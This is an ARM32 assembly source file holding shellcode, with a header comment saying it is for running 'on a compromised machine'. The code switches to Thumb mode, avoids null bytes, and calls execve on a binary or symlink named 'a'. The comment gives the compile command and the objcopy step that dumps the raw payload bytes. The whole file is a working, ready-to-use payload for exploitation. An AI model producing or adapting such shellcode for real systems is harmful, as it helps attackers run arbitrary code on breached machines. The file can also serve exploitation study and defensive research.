/*

Author: Abhinav Thakur
File:   execve.s

PoE:
	This machine code when executed on a compromised machine, will load & run a binary by the name 
	of "a" (either a in current directory or a symbolic link to a binary in some other directory).
	This shellcode was made to execute a custom binary or reduce the size of traditional execve(2)
	binsh shellcode.
	Just create a symbolic link (by the name of "a") pointing to any custom binary. Here, the size
	of shellcode does not vary with the size of custom binary name.

Compile:
	$ arm-linux-gnueabi-gcc -Wl,-N -nostdlib -static execve.s -o ./execve.elf
Dump shellcode :
	$ arm-linux-gnueabi-objcopy --dump-section .text=execve.raw ./execve.elf
Run            :
	$ ./execve.elf

~~ SYSCALL conventions for ARM32
move parameters into => r0, r1, r2, r3, r4, r5
move syscall number  => r7
find return value in => r0

*/

.global _start
_start:

	.code 32
	add r3, pc, #1
	bx r3

	.code 16
	// execve ("a", 0, 0);
	mov r7, #11
	eor r1, r1, r1
	eor r2, r2, r2
	adr r0, binaryPath
	strb r2, [r0, #1]	
	svc #1
	
	
binaryPath:
.ascii "aX"

